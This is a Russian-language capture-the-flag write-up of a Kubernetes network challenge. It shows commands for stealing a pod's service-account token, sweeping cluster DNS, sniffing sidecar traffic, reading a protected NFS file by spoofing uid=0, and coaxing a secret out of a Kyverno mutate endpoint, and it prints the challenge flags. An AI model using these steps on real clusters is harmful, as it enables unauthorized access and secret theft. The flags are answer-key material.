## My solution for `https://www.k8slanparty.com/` challenge.

# 1 DNSing with the stars

Ссылка задания ведёт на интересную страницу с опросом DNS кластера. Но внутренний DNS в поде ничего не разрешает:
```
dig +short 127-0-0-1.default.pod.cluster.local
```

```
cat /etc/resolv.conf
search k8s-lan-party.svc.cluster.local svc.cluster.local cluster.local us-west-1.compute.internal
nameserver 10.100.120.34
options ndots:5
```

Ясно, что это не тот DNS, но какой верный было непонятно. Внутри пода есть `kubectl`, но он бесполезный. Файла `~/.kube/config` тоже нет. Тут я взял первую подсказку:

```
Make sure you scan the correct subnet. You can get a hint of what the correct subnet is by looking at the Kubernetes API server address in the machine’s environment variables.
```

Я не догадался, что kubectl брал данные из переменных окружения.

```
env
...
KUBERNETES_SERVICE_HOST=10.100.0.1
...
```

После этого я вытащил токен и попробовал посмотреть службы:

```
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

```
curl -k --header "Authorization: Bearer $TOKEN" https://10.100.0.1:443/api/v1/services
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "services is forbidden: User \"system:serviceaccount:k8s-lan-party:default\" cannot list resource \"services\" in API group \"\" at the cluster scope",
  "reason": "Forbidden",
  "details": {
    "kind": "services"
  },
  "code": 403
```

Из этого ничего не вышло, и я решил дальше заняться DNS c новым сервером. Обычно в кластере kube-dns находится на 10 IP-адресе сети служб. Сделал запрос на удачу:

```
dig @10.100.0.10 +short -x 10.100.0.1 
kubernetes.default.svc.cluster.local.
```

Я нашёл DNS кластера, осталось выудить из него максимум информации. В статье-подсказке это делали при помощи `nmap`, но nmap нужно настраивать на работу со сторонним DNS, а править /etc/resolv.conf не давало. Я написал скрипт:

```
for i in {0..255}; do
for j in {0..255}; do
    
  dig @10.100.0.10 +short -x 10.100.${j}.${i} | grep -v compute

done
done
```

```
bash 123.sh
kubernetes.default.svc.cluster.local.
kube-dns.kube-system.svc.cluster.local.
player@wiz-k8s-lan-party:~$ vi 123.sh
player@wiz-k8s-lan-party:~$ bash 123.sh
kubernetes.default.svc.cluster.local.
kube-dns.kube-system.svc.cluster.local.
kyverno-svc.kyverno.svc.cluster.local.
challenge-1-custom-coredns-service.k8s-lan-party.svc.cluster.local.
challenge-2-custom-coredns-service.k8s-lan-party.svc.cluster.local.
aws-load-balancer-webhook-service.kube-system.svc.cluster.local.
proxy-service-ced9fa4a.infra.svc.cluster.local.
challenge-5-custom-coredns-service.k8s-lan-party.svc.cluster.local.
kyverno-svc-metrics.kyverno.svc.cluster.local.
cert-manager.cert-manager.svc.cluster.local.
cert-manager-webhook.cert-manager.svc.cluster.local.
reporting-service.k8s-lan-party.svc.cluster.local.
challenge-4-custom-coredns-service.k8s-lan-party.svc.cluster.local.
istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
challenge-3-custom-coredns-service.k8s-lan-party.svc.cluster.local.
kyverno-background-controller-metrics.kyverno.svc.cluster.local.
istio-egressgateway.istio-system.svc.cluster.local.
istiod.istio-system.svc.cluster.local.
kyverno-cleanup-controller.kyverno.svc.cluster.local.
kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
attacker-deployment-service-load-balancer.infra.svc.cluster.local.
getflag-service.k8s-lan-party.svc.cluster.local.
```
После этого он накопал кучу служб. Последовательное их разрешение и курление дало 2 флага:

```
dig @10.100.0.10 +short getflag-service.k8s-lan-party.svc.cluster.local.
10.100.136.254
```

```
curl 10.100.136.254
wiz_k8s_lan_party{between-thousands-of-ips-you-found-your-northen-star}
```

Это был флаг первого задания.

```
dig @10.100.0.10 +short istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
10.100.224.159
```

```
curl 10.100.224.159
wiz_k8s_lan_party{only-leet-hex0rs-can-play-both-k8s-and-linux}
```

Он впоследствии оказался флагом 4-го задания, но я получил его неправомерным путём, если такой термин есть в CTF.


# 2 Hello?

Нос на изображении задания подсказывает, что нужно `понюхать` трафик. Но я зашёл с другого края. Поскольку разговор о сайдкарах, я думал, что у них может быть общий том.

```
grep -R "wiz_k8s" /
```

Это не дало результата и я решил посмотреть сеть. Нетстат показал активность. Это не были процессы моего контейнера, значит это сайдкар, который рядом.

```
netstat -tulpan
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 192.168.3.89:43126      10.100.171.123:80       TIME_WAIT   -                   
...
```

Я подёргал курлом, куда он обращался, но там ничего интересного:
```
curl -iv 10.100.171.123:80
*   Trying 10.100.171.123:80...
* Connected to 10.100.171.123 (10.100.171.123) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.100.171.123
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< server: istio-envoy
server: istio-envoy
< date: Tue, 19 Mar 2024 17:22:35 GMT
date: Tue, 19 Mar 2024 17:22:35 GMT
< content-type: text/plain
content-type: text/plain
< x-envoy-upstream-service-time: 1
x-envoy-upstream-service-time: 1
< x-envoy-decorator-operation: :0/*
x-envoy-decorator-operation: :0/*
< transfer-encoding: chunked
transfer-encoding: chunked
```

Тогда решил поснифить трафик целиком:
```
tcpdump -avvs0

    192.168.3.89.45478 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], cksum 0x7add (incorrect -> 0xaa2b), seq 1:215, ack 1, win 502, options [nop,nop,TS val 2700997730 ecr 311445796], length 214: HTTP, length: 214
        POST / HTTP/1.1
        Host: reporting-service
        User-Agent: curl/7.64.0
        Accept: */*
        Content-Length: 63
        Content-Type: application/x-www-form-urlencoded

        wiz_k8s_lan_party{good-crime-comes-with-a-partner-in-a-sidecar}
```

Букавально сразу же зацепился глазом за флаг.


# 3 Exposed File Share

В аннотации написано про старую сетевую хранилку. Мысли возникли про GusterFS и NFS. Первым делом поискал в mount IP-адреса:

```
mount | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.4.189,local_lock=none,addr=192.168.124.98)
```

Отлично, в `/efs` лежит флаг осталось его забрать:

```
cat: /efs/flag.txt: Permission denied
```

С локальной системы под моим юзером его не взять. Нужно пробовать по сети. Набрал в строке nfs и нажал `tab`. У меня в поде оказывается есть nfs-утилиты. Я долго тупил, даже хотел взять подсказку, поскольку без `?version=4.1` команда молчала.

```
nfs-ls nfs://192.168.124.98/?version=4.1
----------  1     1     1           73 flag.txt
```

Получив листинг, я стал увереным, что смогу скопировать файл себе. Но получил ошибку `failed with NFS4ERR_ACCESS(-13)"`. Эта ошибка известна в интернетах и решается указание uid=0:

```
nfs-cp 'nfs://192.168.124.98//flag.txt?version=4.1&uid=0' xz2
copied 73 bytes
```
Флаг получен:

```
cat xz2 
wiz_k8s_lan_party{old-school-network-file-shares-infiltrated-the-cloud!}
```

# 4 The Beauty and The Ist

Я получил его флаг в самом начале, тем не менее решил посмотреть, в чём там дело. По нетстату нашёл кучу открытых соединений, один из них оказался веб-мордой istio-admin. Через API `/help` он показал, как слить его настройки.
В этом задании я не мог их записать на диск - т.к. размер файла был ограничен, а разбираться дальше не хотелось, поскольку флаг у меня уже был.

# 5 Who will guard the guardians?

Тут даётся отсылка к документации на контроллеры допуска и всё. Я очень приуныл. Взял подсказку:

```
Need a hand crafting AdmissionReview requests? Checkout https://github.com/anderseknert/kube-review.
```

Стало ясно, что надо искать контроллер допуска в кластере. И тут я заметил огромную кнопку `VIEW POLICY`. Уже была ночь, и я страшно тупил.
```
apiVersion: kyverno.io/v1
kind: Policy
metadata:
  name: apply-flag-to-env
  namespace: sensitive-ns
spec:
  rules:
    - name: inject-env-vars
      match:
        resources:
          kinds:
            - Pod
      mutate:
```

С этим стало понятно, что ресь идёт о Киверно. Его службу я нашёл в первом задании:

```
curl -v -k https://kyverno-svc.kyverno.svc.cluster.local.
```

Она ответила 404 ошибкой. Судя по policy она ждёт `AdmissionReview` с подом из пространства `sensitive-ns` на свой `mutate` эндпоинт.

Я залез на киллеркоду, запустил киверно, посмотрел, что там есть по умолчанию. Это дало пути `verifymutate` и `validate`, которые тоже можно было подёргать.

Далее установил генератор AdmissionReview из подсказки:

```
wget https://github.com/anderseknert/kube-review/releases/download/v0.3.0/kube-review-linux-amd64
chmod +x kube-review-linux-amd64
```

Теперь создал манифест пода, чтобы он зацепил эту полиси:

```
k run -n sensitive-ns nginx --image nginx --dry-run -oyaml > test.yaml
```

После этого сгенерировал ревью:

```
./kube-review-linux-amd64 create test.yaml 
```

Вернулся в челендж, вставил сгенерённый ревью в файл `a.json` и отправил на работу в Киверно. Я подозревал, что мне нужен `mutate`, но решил пробовать все пути.

```
curl -X POST -v -k --header 'Content-Type: application/json' https://kyverno-svc.kyverno.svc.cluster.local./validate -d @a.json
```

Это не удалось.

```
curl -X POST -v -k --header 'Content-Type: application/json' https://kyverno-svc.kyverno.svc.cluster.local./mutate -d @a.json
```

Это вернуло патч манифеста. Декодировав текст я получил последний ключ:

```
echo YW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d | base64 -d
ame":"FLAG","value":"wiz_k8s_lan_party{you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory}"}]}, {"path":"/metadata/annotations","op":"add","value":{"policies.kyverno.io/last-applied-patches":"inject-env-vars.apply-flag-to-env.kyverno.io: added /spec/containers/0/env\n"}}]
```

И это всё, вот сертификат. 

![uE8sswHQ.png](https://raw.githubusercontent.com/dushasokol-tasks/k8slanparty2024/main/uE8sswHQ.png)

Всем привет! ))
